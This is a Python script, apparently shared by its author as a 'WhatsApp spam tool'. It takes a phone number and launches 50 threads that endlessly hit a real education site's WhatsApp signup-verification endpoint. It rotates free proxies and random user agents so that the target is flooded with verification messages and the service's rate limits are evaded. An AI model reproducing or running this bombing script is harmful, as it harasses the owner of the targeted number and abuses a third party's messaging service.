try:
 import requests,os
 import time
 from cfonts import render, say
 from colorama import init, Fore, Style
 from datetime import datetime
 from itertools import cycle
 import json
except ModuleNotFoundError:
 os.system('pip install requests')
 os.system('pip install colorama')
 os.system('pip install cfonts')
 os.system('pip install itertools')
 os.system('clear')
b='\033[31m' #red
g='\033[32m' #green
y='\033[33m' #yellow
p='\033[34m' #blue
m='\033[35m' #magenta
c='\033[36m' #cyan
w='\033[37m' #white
def JOK(text, delay, add_new_line=True):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    if add_new_line:
        print("\n", end="", flush=True)
output = render('🇮🇳 ARJUN 🇮🇳', colors=['white', 'blue'], align='center')
print (output)
JOK(m+f"\033[1;32m\n                  『ᴍᴀᴅᴇ ʙʏ : ᴛᴏxɪᴄ ᴀʀᴊᴜɴ ™ \n                         ᴛᴇʟᴇɢʀᴀᴍ: @privatearjun \n                            ᴄʜᴀɴɴᴇʟ : @ᴛᴏxɪᴄᴀʀᴊᴜɴ  』", 0.07, True)
import requests,sys,threading
import json,os,random
from rich.panel import Panel as nel
from rich import print as cetak
from user_agent import generate_user_agent
from rich import print 
from rich.panel import Panel
GOOD=0
BAD=0
import webbrowser
webbrowser.open('https://t.me/Privatearjun')

cetak(nel('\t\t• ---> ex : 91xxxxxx or 98xxxx <---•', style='green'))
cetak(nel('\t\t• 𝗧𝗢𝗫𝗜𝗖 𝗔𝗥𝗝𝗨𝗡 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗦𝗣𝗔𝗠 𝗧𝗢𝗢𝗟•', style='yellow'))
NUM=input('<\> 𝗘𝗻𝘁𝗲𝗿 𝗬𝗼𝘂𝗿 𝗡𝘂𝗺𝗯𝗲𝗿: ')
os.system('clear')
from rich import print 
from rich.panel import Panel  
ti = '[i][bold green] @CDMAXX[/bold green][/i]'
te = '[green]Done [/green] PY ---> SEND  '
print(Panel(te,title=ti)) 
def AAA():
	global GOOD,BAD
	while True:
		prox= requests.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies').text
		nip=random.choice(prox)
		proxs= {'http': 'socks4://'+nip}
		url = "https://gw.abgateway.com/student/whatsapp/signup"
		headers = {
		  'User-Agent': generate_user_agent(),
		  'Accept': "application/json",
		  #'Accept-Encoding': "gzip, deflate, br, zstd",
		  'Content-Type': "application/json",
		  'x-trace-id': "guest_user:ec71bc1f-7bf7-490a-b0dc-dad31e7f31d7",
		  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		  'sec-ch-ua-mobile': "?1",
		  'access-control-allow-origin': "*",
		  'platform': "web",
		  'sec-ch-ua-platform': "\"Android\"",
		  'origin': "https://abwaab.com",
		  'sec-fetch-site': "cross-site",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://abwaab.com/",
		  'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
		  'priority': "u=1, i"
		}
		payload = json.dumps({
		  "language": "En",
		  "password": "12341ghf23",
		  "phone": "+91"+NUM,
		  "country": "IN",
		  "country_code": "91",
		  "platform": "web"
		})
		response = requests.post(url, data=payload, headers=headers,proxies=proxs).text
		if 'Whatsapp code is sent successfull'in str(response):
			GOOD+=1
			sys.stdout.write(f"\r[\x1b[1;94mSIN] \x1b[1;91m[NOT SEEND ] {BAD}|\033[95m[GOOD SEND ][{(GOOD)}]"),sys.stdout.flush()	
		else:
			BAD+=1
			sys.stdout.write(f"\r[\x1b[1;94mSIN] \x1b[1;91m[NOT SEEND ] {BAD}|\033[95m[GOOD SEEND ][{(GOOD)}]"),sys.stdout.flush()	
			
Threads=[] 
for t in range(50):
 x = threading.Thread(target=AAA)
 x.start()
 Threads.append(x)
for Th in Threads:
 AAA()